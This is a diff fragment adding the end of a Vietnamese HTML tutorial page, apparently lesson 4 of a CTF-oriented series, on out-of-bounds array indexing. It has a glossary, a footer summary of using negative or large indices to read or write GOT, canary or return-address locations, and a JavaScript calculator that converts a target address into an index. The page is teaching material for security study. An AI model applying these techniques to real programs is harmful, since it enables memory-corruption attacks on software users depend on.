+    <div class="card"><div class="term">index âm</div><p>idx&lt;0 → trước mảng.</p></div>
+    <div class="card"><div class="term">arbitrary R/W</div><p>Đọc/ghi địa chỉ bất kỳ.</p></div>
+    <div class="card"><div class="term">alignment</div><p>Đích chia hết elem_size.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nguồn index: <a href="integer_bugs.html">integer_bugs</a>. Đích: <a href="leak_techniques.html">leak</a> · <a href="exit_handlers.html">exit handler</a> (Full RELRO). Nền: <a href="stack_overflow.html">stack_overflow</a>.</li>
+    <li>CWE-125/787 (OOB read/write).</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 1 · Bài 4 (cuối Phase 1).</strong> arr[idx] = *(arr+idx*size). Chọn idx (âm/lớn) để đọc/ghi GOT/canary/RIP. Mạnh hơn overflow (nhảy thẳng, không qua canary). HẾT PHASE 1 — tiếp theo Phase 5.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("oob-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("oob-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  function pv(s){s=(s||"").trim();try{if(/^-?0x/i.test(s))return parseInt(s,16);if(/^-?\d+$/.test(s))return parseInt(s,10);}catch(e){}return null;}
+  var baseIn=document.getElementById("baseIn"),elemIn=document.getElementById("elemIn"),tgtIn=document.getElementById("tgtIn"),cells=document.getElementById("cells"),avmsg=document.getElementById("avmsg");
+  function calc(){
+    var base=pv(baseIn.value),elem=pv(elemIn.value),tgt=pv(tgtIn.value);
+    if(base===null||elem===null||tgt===null||elem<=0){cells.innerHTML='';avmsg.textContent="nhập số hợp lệ";return;}
+    var diff=tgt-base, idx=Math.trunc(diff/elem), aligned=(diff%elem)===0;
+    function hx(x){return (x<0?"-0x"+(-x).toString(16):"0x"+x.toString(16));}
+    var rows=[
+      {name:"đích",addr:tgt,idx:idx,hit:true},
+      {name:"arr[0] (base)",addr:base,idx:0},
+      {name:"arr[1]",addr:base+elem,idx:1}
+    ];
+    cells.innerHTML=rows.map(function(r){
+      return '<div class="c arr'+(r.hit?' hit':'')+'"><span>'+r.name+'</span><span class="a">'+hx(r.addr)+'</span><span>idx = '+r.idx+'</span></div>';
+    }).join("");
+    avmsg.innerHTML = aligned
+      ? '✓ <b>arr['+idx+']</b> = *(base '+(idx<0?'-':'+')+' '+Math.abs(idx)+'*'+elem+') = '+hx(tgt)+' → đọc/ghi được.'
+      : '<span style="color:var(--danger)">✗ LỆCH: (đích−base)='+hx(diff)+' không chia hết '+elem+' → idx='+idx+' trỏ '+hx(base+idx*elem)+' (lệch '+(diff%elem)+' byte). Chọn đích căn.</span>';
+  }
+  [baseIn,elemIn,tgtIn].forEach(function(e){e.addEventListener("input",calc);});calc();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
